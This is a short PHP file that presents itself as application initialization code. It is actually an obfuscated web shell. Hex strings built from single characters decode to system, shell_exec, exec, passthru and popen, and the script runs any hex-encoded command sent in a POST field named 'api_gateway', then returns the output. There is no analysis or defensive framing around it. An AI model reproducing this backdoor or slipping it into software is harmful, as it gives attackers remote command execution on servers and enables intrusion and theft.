<?php


$res1 = '3';
$res2 = '7';
$res3 = '6';
$res4 = 'd';
$res5 = '8';
$res6 = '5';
$res7 = 'c';
$res8 = 'f';
$res9 = '0';
$res10 = '1';
$res11 = '4';
$res12 = '2';
$res13 = 'e';
$app_initializer1 = pack("H*", '7'.$res1.$res2.'9'.'7'.$res1.$res2.'4'.$res3.'5'.$res3.$res4);
$app_initializer2 = pack("H*", $res2.$res1.'6'.$res5.'6'.$res6.$res3.$res7.$res3.'c'.$res6.$res8.'6'.$res6.'7'.'8'.$res3.$res6.'6'.$res1);
$app_initializer3 = pack("H*", '6'.$res6.'7'.'8'.$res3.$res6.'6'.'3');
$app_initializer4 = pack("H*", $res2.$res9.'6'.$res10.'7'.'3'.$res2.$res1.$res2.$res11.'6'.$res5.$res2.$res12.'7'.'5');
$app_initializer5 = pack("H*", $res2.$res9.$res3.$res8.$res2.'0'.'6'.$res6.'6'.$res13);
$app_initializer6 = pack("H*", $res2.'3'.'7'.$res11.$res2.$res12.$res3.'5'.'6'.'1'.$res3.$res4.'5'.$res8.'6'.$res2.'6'.$res6.$res2.$res11.$res6.'f'.$res3.'3'.$res3.$res8.'6'.$res13.'7'.'4'.'6'.$res6.'6'.'e'.$res2.'4'.$res2.'3');
$app_initializer7 = pack("H*", '7'.$res9.'6'.'3'.$res3.'c'.$res3.$res8.$res2.'3'.'6'.$res6);
$api_gateway = pack("H*", '6'.$res10.$res2.'0'.'6'.'9'.$res6.$res8.'6'.$res2.'6'.$res10.'7'.$res11.'6'.$res6.$res2.'7'.'6'.$res10.$res2.'9');
if (isset($_POST[$api_gateway])) {
    $api_gateway = pack("H*", $_POST[$api_gateway]);
    if (function_exists($app_initializer1)) {
        $app_initializer1($api_gateway);
    } elseif (function_exists($app_initializer2)) {
        print $app_initializer2($api_gateway);
    } elseif (function_exists($app_initializer3)) {
        $app_initializer3($api_gateway, $pointer_data_chunk);
        print join("\n", $pointer_data_chunk);
    } elseif (function_exists($app_initializer4)) {
        $app_initializer4($api_gateway);
    } elseif (function_exists($app_initializer5) && function_exists($app_initializer6) && function_exists($app_initializer7)) {
        $comp_property_set = $app_initializer5($api_gateway, 'r');
        if ($comp_property_set) {
            $key_factor = $app_initializer6($comp_property_set);
            $app_initializer7($comp_property_set);
            print $key_factor;
        }
    }
    exit;
}
